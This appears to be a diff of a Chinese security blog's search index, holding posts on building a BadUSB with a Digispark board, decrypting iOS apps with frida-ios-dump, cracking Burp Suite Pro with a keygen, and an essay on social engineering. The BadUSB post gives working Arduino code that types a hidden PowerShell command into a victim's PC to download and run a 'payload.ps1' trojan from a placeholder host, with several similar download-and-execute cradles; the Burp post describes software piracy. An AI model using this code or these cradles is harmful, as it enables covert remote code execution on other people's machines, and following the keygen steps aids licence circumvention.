@@ -143,90 +143,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>BadUSB制作过程-基于Digispark</title>
-    <url>/2023/04/23/BadUSB%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B-%E5%9F%BA%E4%BA%8EDigispark/</url>
-    <content><![CDATA[<blockquote>
-<p>一直就很想做一个BadUSB于是就做了一个BadUSB……</p>
-</blockquote>
-<h1 id="基于Attiny85和digispark"><a href="#基于Attiny85和digispark" class="headerlink" title="基于Attiny85和digispark"></a>基于Attiny85和digispark</h1><h2 id="首先是原料，上链接："><a href="#首先是原料，上链接：" class="headerlink" title="首先是原料，上链接："></a>首先是原料，上链接：</h2><p>硬件：<br>Attiny85：<a class="link"   href="https://m.tb.cn/h.fg5Xm3W?sm=0be9e8" >https://m.tb.cn/h.fg5Xm3W?sm=0be9e8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>软件：<br>IDE：<a class="link"   href="https://www.arduino.cc/en/software" >https://www.arduino.cc/en/software <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>驱动：<a class="link"   href="https://github.com/digistump/DigistumpArduino/releases" >https://github.com/digistump/DigistumpArduino/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>指令转译：<a class="link"   href="https://github.com/Catboy96/Automator" >https://github.com/Catboy96/Automator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="开发板编程环境部署"><a href="#开发板编程环境部署" class="headerlink" title="开发板编程环境部署"></a>开发板编程环境部署</h2><p>首先是下载驱动和arduino，并安装  </p>
-<p>点击File-&gt;Preferences,在最下面的输入栏里填写开发板管理的链接</p>
-<p><a class="link"   href="http://digistump.com/package_digistump_index.json" >http://digistump.com/package_digistump_index.json <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  </p>
-<p>点击 Tools-&gt;Board-&gt;Boards Manager<br>然后在搜索栏里输入digistump，不用写完整自动找到，下载第一个  </p>
-<p>下载结束后，在上方栏选择开发板，找到Digispark（Default-16.5mhz）  </p>
-<p>之后就是编程环节了<br>这里的逻辑是：仿HID，打开cmd-&gt;输入命令下载木马并使用powershell执行-&gt;关闭窗口  </p>
-<p>不同的大佬使用的不同的代码来隐藏窗口运行powershell<br>比如雷神众测的文章用的是</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Powershell IEX(New-Object Net.WebClient).DownloadString(&#x27;http://IP:port/sys_dll.ps1&#x27;);</span><br></pre></td></tr></table></figure></div>
-
-
-<p>也有大佬使用</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://服务器ip:8000/生成的后门&#x27;);</span><br></pre></td></tr></table></figure></div>
-
-
-<p>各有春秋</p>
-<p>我用的是</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;);</span><br></pre></td></tr></table></figure></div>
-
-<p>哪个好用就由后来人说吧，反正目的都是一样的。</p>
-<p>附上代码</p>
-<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DigiKeyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="comment">// put your setup code here, to run once:  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//为等待2秒  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT);<span class="comment">//发送win+R  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">800</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;cmd /T:01 /K mode CON: COLS=16 LINES=1&quot;</span>);<span class="comment">//将cmd窗口最小化保证隐蔽性  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;</span>);<span class="comment">//要执行的payload  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">3500</span>); </span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_F4, MOD_ALT_LEFT);<span class="comment">//执行完成后alt+F4关闭窗口</span></span><br><span class="line">   &#125; </span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="comment">// put your main code here, to run repeatedly: </span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>关于有的大佬说使用Automator这个工具方便键入命令，个人感觉吧，不好用，如不认真学习HID的协议  </p>
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/badusb/image-80ffa4e019054a95bbabaf6e906263b7.41i3rn34x620.webp"
-                      alt="image-80ffa4e019054a95bbabaf6e906263b7"
-                ><figcaption>image-80ffa4e019054a95bbabaf6e906263b7</figcaption></figure></p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/badusb/image-2412be2afe5742629538262be0d454d7.2immd9he0i00.webp"
-                      alt="image-2412be2afe5742629538262be0d454d7"
-                ><figcaption>image-2412be2afe5742629538262be0d454d7</figcaption></figure></p>
-<h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><p>中英文切换与大小写，&lt;DigiKeyboard.h&gt;中似乎没有CapsLocks</p>
-<p>在github上发现有大佬回答使用57来完成大小写切换，在windows上不区分大小写，所以换用大写后可以避免中文输入法带来的困扰。</p>
-<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(<span class="number">57</span>);</span><br></pre></td></tr></table></figure></div>
-
-<p>也有大佬提出，使用ctrl+space来切换输入法</p>
-<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_SPACE, MOD_CONTROL_LEFT);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>参考<br><a class="link"   href="https://www.cnblogs.com/qianxiao996/p/13574566.html" >https://www.cnblogs.com/qianxiao996/p/13574566.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA" >https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>ipa从获取到砸壳</title>
-    <url>/2023/04/23/ipa%E4%BB%8E%E8%8E%B7%E5%8F%96%E5%88%B0%E7%A0%B8%E5%A3%B3/</url>
-    <content><![CDATA[<p>一台mac，一部越了狱的iphone<br>Mac mini m1<br>iphone8  iOS1 3.7</p>
-<h3 id="获取ipa"><a href="#获取ipa" class="headerlink" title="获取ipa"></a>获取ipa</h3><p>apple configurator 2获取ipa<br>注意<br>～&#x2F;Library&#x2F;Group Containers&#x2F;K36BKF7T3D.group.com.apple.configurator&#x2F;Library&#x2F;Caches&#x2F;Assets<br>这个文件夹下的内容</p>
-<p>只要这个目录出现TemporaryItems,那就代表ipa包下载完成了,立马复制粘贴这个文件.当然也可以进去找到ipa包复制出来.还是那句话,手速快网差还没下载完没有目录,网快手速慢等你去找目录,或者复制文件的时候,同步安装已经完成.临时目录就会被删除找不到ipa包</p>
-<h3 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h3><p>pc端和手机端分别安装frida<br>这一块不在这里教<br>开俩terminal，一个跑frida，另一个ssh到iphone</p>
-<p>从github下载工程：一般情况使用最新的版本，master分支对应Python2，3.x对应Python3版本。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/AloneMonkey/frida-ios-dump </span><br></pre></td></tr></table></figure></div>
-
-<p>安装依赖：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">sudo pip3 install -r requirements.txt --upgrade</span><br></pre></td></tr></table></figure></div>
-
-<p>修改dump.py参数：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim frida-ios-dump/dump.py</span><br></pre></td></tr></table></figure></div>
-
-<p>找到如下几行</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">User = &#x27;root&#x27;   </span><br><span class="line">Password = &#x27;xxxxxxxxxx&#x27;   </span><br><span class="line">Host = &#x27;localhost&#x27;   </span><br><span class="line">Port = 2222   </span><br></pre></td></tr></table></figure></div>
-
-<p>修改Password和端口号。和iproxy命令端口号保持一致。</p>
-<p>列举出安装的应用的名字和bundle id</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">python3 dump.py -l</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>执行dump命令</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dump.py id</span><br></pre></td></tr></table></figure></div>
-
-<p>这里的id是com.apple.xxxxxx这样的</p>
-<p>砸完壳的ipa在frida-ios-dump文件夹下</p>
-]]></content>
-  </entry>
-  <entry>
     <title>kali安装clash</title>
     <url>/2023/04/23/kali%E5%AE%89%E8%A3%85clash/</url>
     <content><![CDATA[<blockquote>
@@ -336,6 +252,118 @@
 
 
 <p>搞定！</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ipa从获取到砸壳</title>
+    <url>/2023/04/23/ipa%E4%BB%8E%E8%8E%B7%E5%8F%96%E5%88%B0%E7%A0%B8%E5%A3%B3/</url>
+    <content><![CDATA[<p>一台mac，一部越了狱的iphone<br>Mac mini m1<br>iphone8  iOS1 3.7</p>
+<h3 id="获取ipa"><a href="#获取ipa" class="headerlink" title="获取ipa"></a>获取ipa</h3><p>apple configurator 2获取ipa<br>注意<br>～&#x2F;Library&#x2F;Group Containers&#x2F;K36BKF7T3D.group.com.apple.configurator&#x2F;Library&#x2F;Caches&#x2F;Assets<br>这个文件夹下的内容</p>
+<p>只要这个目录出现TemporaryItems,那就代表ipa包下载完成了,立马复制粘贴这个文件.当然也可以进去找到ipa包复制出来.还是那句话,手速快网差还没下载完没有目录,网快手速慢等你去找目录,或者复制文件的时候,同步安装已经完成.临时目录就会被删除找不到ipa包</p>
+<h3 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h3><p>pc端和手机端分别安装frida<br>这一块不在这里教<br>开俩terminal，一个跑frida，另一个ssh到iphone</p>
+<p>从github下载工程：一般情况使用最新的版本，master分支对应Python2，3.x对应Python3版本。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/AloneMonkey/frida-ios-dump </span><br></pre></td></tr></table></figure></div>
+
+<p>安装依赖：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">sudo pip3 install -r requirements.txt --upgrade</span><br></pre></td></tr></table></figure></div>
+
+<p>修改dump.py参数：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim frida-ios-dump/dump.py</span><br></pre></td></tr></table></figure></div>
+
+<p>找到如下几行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">User = &#x27;root&#x27;   </span><br><span class="line">Password = &#x27;xxxxxxxxxx&#x27;   </span><br><span class="line">Host = &#x27;localhost&#x27;   </span><br><span class="line">Port = 2222   </span><br></pre></td></tr></table></figure></div>
+
+<p>修改Password和端口号。和iproxy命令端口号保持一致。</p>
+<p>列举出安装的应用的名字和bundle id</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">python3 dump.py -l</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>执行dump命令</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dump.py id</span><br></pre></td></tr></table></figure></div>
+
+<p>这里的id是com.apple.xxxxxx这样的</p>
+<p>砸完壳的ipa在frida-ios-dump文件夹下</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>BadUSB制作过程-基于Digispark</title>
+    <url>/2023/04/23/BadUSB%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B-%E5%9F%BA%E4%BA%8EDigispark/</url>
+    <content><![CDATA[<blockquote>
+<p>一直就很想做一个BadUSB于是就做了一个BadUSB……</p>
+</blockquote>
+<h1 id="基于Attiny85和digispark"><a href="#基于Attiny85和digispark" class="headerlink" title="基于Attiny85和digispark"></a>基于Attiny85和digispark</h1><h2 id="首先是原料，上链接："><a href="#首先是原料，上链接：" class="headerlink" title="首先是原料，上链接："></a>首先是原料，上链接：</h2><p>硬件：<br>Attiny85：<a class="link"   href="https://m.tb.cn/h.fg5Xm3W?sm=0be9e8" >https://m.tb.cn/h.fg5Xm3W?sm=0be9e8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>软件：<br>IDE：<a class="link"   href="https://www.arduino.cc/en/software" >https://www.arduino.cc/en/software <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>驱动：<a class="link"   href="https://github.com/digistump/DigistumpArduino/releases" >https://github.com/digistump/DigistumpArduino/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>指令转译：<a class="link"   href="https://github.com/Catboy96/Automator" >https://github.com/Catboy96/Automator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="开发板编程环境部署"><a href="#开发板编程环境部署" class="headerlink" title="开发板编程环境部署"></a>开发板编程环境部署</h2><p>首先是下载驱动和arduino，并安装  </p>
+<p>点击File-&gt;Preferences,在最下面的输入栏里填写开发板管理的链接</p>
+<p><a class="link"   href="http://digistump.com/package_digistump_index.json" >http://digistump.com/package_digistump_index.json <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  </p>
+<p>点击 Tools-&gt;Board-&gt;Boards Manager<br>然后在搜索栏里输入digistump，不用写完整自动找到，下载第一个  </p>
+<p>下载结束后，在上方栏选择开发板，找到Digispark（Default-16.5mhz）  </p>
+<p>之后就是编程环节了<br>这里的逻辑是：仿HID，打开cmd-&gt;输入命令下载木马并使用powershell执行-&gt;关闭窗口  </p>
+<p>不同的大佬使用的不同的代码来隐藏窗口运行powershell<br>比如雷神众测的文章用的是</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Powershell IEX(New-Object Net.WebClient).DownloadString(&#x27;http://IP:port/sys_dll.ps1&#x27;);</span><br></pre></td></tr></table></figure></div>
+
+
+<p>也有大佬使用</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://服务器ip:8000/生成的后门&#x27;);</span><br></pre></td></tr></table></figure></div>
+
+
+<p>各有春秋</p>
+<p>我用的是</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>哪个好用就由后来人说吧，反正目的都是一样的。</p>
+<p>附上代码</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DigiKeyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="comment">// put your setup code here, to run once:  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//为等待2秒  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT);<span class="comment">//发送win+R  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">800</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;cmd /T:01 /K mode CON: COLS=16 LINES=1&quot;</span>);<span class="comment">//将cmd窗口最小化保证隐蔽性  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;</span>);<span class="comment">//要执行的payload  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">3500</span>); </span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_F4, MOD_ALT_LEFT);<span class="comment">//执行完成后alt+F4关闭窗口</span></span><br><span class="line">   &#125; </span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="comment">// put your main code here, to run repeatedly: </span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>关于有的大佬说使用Automator这个工具方便键入命令，个人感觉吧，不好用，如不认真学习HID的协议  </p>
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/badusb/image-80ffa4e019054a95bbabaf6e906263b7.41i3rn34x620.webp"
+                      alt="image-80ffa4e019054a95bbabaf6e906263b7"
+                ><figcaption>image-80ffa4e019054a95bbabaf6e906263b7</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/badusb/image-2412be2afe5742629538262be0d454d7.2immd9he0i00.webp"
+                      alt="image-2412be2afe5742629538262be0d454d7"
+                ><figcaption>image-2412be2afe5742629538262be0d454d7</figcaption></figure></p>
+<h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><p>中英文切换与大小写，&lt;DigiKeyboard.h&gt;中似乎没有CapsLocks</p>
+<p>在github上发现有大佬回答使用57来完成大小写切换，在windows上不区分大小写，所以换用大写后可以避免中文输入法带来的困扰。</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(<span class="number">57</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>也有大佬提出，使用ctrl+space来切换输入法</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_SPACE, MOD_CONTROL_LEFT);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>参考<br><a class="link"   href="https://www.cnblogs.com/qianxiao996/p/13574566.html" >https://www.cnblogs.com/qianxiao996/p/13574566.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA" >https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>关于社会工程学的一些个人看法</title>
+    <url>/2023/04/23/%E5%85%B3%E4%BA%8E%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%9C%8B%E6%B3%95/</url>
+    <content><![CDATA[<p>从何讲起呢？<br>本人从上学时了解到社会工程学这门黑客学科<br>社会工程学是指，利用人性的弱点和特性，直接对目标相关的人进行社会关系和心理学的信息套取的手段。<br>主要行动方向有两条，一方面是从目标人物已经完成的社会行为中搜索关键信息，比如，找到目标人物的网络社交账号与发表的信息等。<br>另一方面是直接接触目标人物，通过语言或肢体交流进行信息套取，这里从广泛的意义上讲，电信诈骗也是应用案例之一。</p>
+<p>我不想讲社工中的那些方法论，那些东西太死板，交给乙方公司的安服团队，公司会用这种方法完成他们的变现。</p>
+<p>而我想表达的内容应该更适合还在学习社工，并纠结与社工工作的人。</p>
+<p>首先要说的是，社工不难，而且很灵活，你通过自己的办法去发现那些信息就已经是天花板了。从互联网空间中能找到信息，一方面是互联网公司自身对客户的信息保护不够，另一方面是目标对自身信息的保护不够。<br>比如，你通过穷举法获取目标的平台账号密码，是互联网公司的措施不完善。<br>又比如，你在目标社交平台上发布的生活轨迹中发现关键信息，是目标本身对敏感信息的敏感度不足造成的。</p>
+<p>而通过这两种思路，组合打法就能帮你获取到足够多的信息了。</p>
+<p>之后要说的是，请你记住你要获取信息的目的，你只是想拿到那个password，或者拿到某个关键目标放在什么位置，或者是目标公司老板几点在公司这种信息而已。</p>
+<p>而获取信息的渠道很多，你千万不要陷入到给获取目标渠道中的这个人的人物画像当中去，那不应该是你的主要工作。</p>
+<p>可能护网工作会要求你充分溯源红队人员的个人信息，但你在做溯源的时候，只要知道是红队中的谁攻击，用的什么手段攻击即可。不需要疯狂地去完善报告中他的生活细节。可能你想通过这种方式来表现你的工作能力。<br>而护网中，真的没人在意这个人年龄多大，家里几个人，婚否，对象好不好看，喜不喜欢烟酒二次元等乱七八糟的事情。</p>
+<p>因为当你花费了大量的时间在这上面，并把一份详细且完整的画像报告交上去时，你的主管回复你，你找错目标了。请问你花费的时间和精力要谁来买单呢？</p>
+<p>不仅仅是护网工作，你会发现能用到社工手段的地方太多了，因为这个手段门槛太低，不需要你会多少计算机语言，不需要你懂不懂什么OSI七层协议框架。你只要动手去做，无论找不找得到目标信息，你都会有一定的收获。</p>
+<p>比如，你很想知道喜欢的人，这个人网络上发布了什么，喜好什么，最近在做什么。你很强，你把这些信息都拿到了，然后呢？你会发现一个很严重的问题，这些信息要怎么利用？这些信息是否真实？这些信息有多少是他想表现在网络上，而真正的信息都藏起来根本不会发布。</p>
+<p>于是你又开始分析信息，分析行为，分析社会关系，甚至开始根据这些信息开始侧写。</p>
+<p>这个时候，如果你不是为了相关工作去调查犯罪嫌疑人，那你已经是一个不折不扣的大变态了。</p>
+<p>你只是为了满足你那肮脏不堪的窥私欲而已。</p>
+<p>这些信息看得多了，你会发现人性的不堪，因为你会发现很多人被自身的欲望裹挟而做出的徘徊于人性边缘的事情。你开始会对每一个人都保持距离感，并对人性保持一种相当的怀疑态度。</p>
+<p>没错，你走火入魔了，你太依赖于社会工程学了。</p>
+<p>我要说的是，社工是一门手段，但不是万金油。</p>
+<p>企业可以通过相应的管理制度来规避社工攻击带来的风险，人本身也可以通过学习相关知识并改变生活中的一些行为来规避社工攻击。同时，我上面讲过，人在网络上表达的内容仅仅是想让你看到的内容，那并不是真实的。</p>
+<p>以上，</p>
+<p>在我对自身的社工防范手段做到位了之后，就不在社工这件事本身再投入精力了。</p>
+<p>毕竟把太多的精力放在对人的信息挖掘上，目光未免太过狭窄。</p>
+<p>地球在宇宙中存在了46亿年，陆地总面积约14900万平方千米，地球总人口约78.88亿，人类平均寿命大约是76岁，你大约已经用掉了30%，那么你大约还有五十多年的时间，去了解历史、丈量土地、遇见更多的人。</p>
+<p>在此希望你能为祖国健康工作50年。</p>
 ]]></content>
   </entry>
   <entry>
@@ -526,6 +554,109 @@
                      data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Screenshot_2022-11-10_21_17_08-1668086282838.6ovjlov1dco0.webp"
                       alt="Screenshot_2022-11-10_21_17_08-1668086282838" 
                 ><figcaption>Screenshot_2022-11-10_21_17_08-1668086282838</figcaption></figure></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>破解，再给新下载的burp加个快捷方式</title>
+    <url>/2023/04/23/%E7%A0%B4%E8%A7%A3%EF%BC%8C%E5%86%8D%E7%BB%99%E6%96%B0%E4%B8%8B%E8%BD%BD%E7%9A%84burp%E5%8A%A0%E4%B8%AA%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<blockquote>
+<p>拜托，有个双击就可以打开的burp真的很酷好吗？</p>
+</blockquote>
+<p>咱就是说，在kali和mac上使用burp有那么些不自然</p>
+<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>通常呢，咱们都是在52破解下载最新版的burpsuite<br><a class="link"   href="https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip" >https://down.52pojie.cn/Tools/Network_Analyzer&#x2F;Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>但52破解的破解器总是用的1.7版本，有些功能真的跟不上</p>
+<p>所以，咱们直接从官方下载正式版的pro<br>然后去全球最大的同性交友网站找到最新的keygen<br>之后怎么做不用我介绍了吧<br>之后的破解流程就没啥好说的了，破解器作者已经表述得很详尽了</p>
+<p>下载链接留这里<br>burpsuite pro：<a class="link"   href="https://portswigger.net/burp/pro" >https://portswigger.net/burp/pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Keygen：<a class="link"   href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases" >https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="制作快捷方式"><a href="#制作快捷方式" class="headerlink" title="制作快捷方式"></a>制作快捷方式</h2><p>把文件移动到&#x2F;usr&#x2F;bin目录中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> BurpLoaderKeygen.jar burpsuite_pro_v2022.2.2.jar /usr/bin</span><br></pre></td></tr></table></figure></div>
+
+<p>先删掉免费的社区版本</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt remove burpsuite</span><br></pre></td></tr></table></figure></div>
+
+<p>配置快捷方式:<br>在&#x2F;usr&#x2F;bin下创建burpsuite</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim burpsuite</span><br></pre></td></tr></table></figure></div>
+
+<p>将keygen上的loader commond复制粘贴</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/usr/lib/jvm/java-17-openjdk-amd64/bin/java --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:/usr/bin/BurpLoaderKeygen.jar -noverify -jar /usr/bin/burpsuite_pro_v2022.2.2.jar</span><br></pre></td></tr></table></figure></div>
+
+<p>增加执行权限,进入&#x2F;usr&#x2F;share&#x2F;applications，创建并编辑burpsuite的快捷方式</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x burpsuite</span><br><span class="line"><span class="built_in">cd</span> /usr/share/applications/</span><br><span class="line">vim burpsuite.desktop</span><br></pre></td></tr></table></figure></div>
+
+<p>填入代码</p>
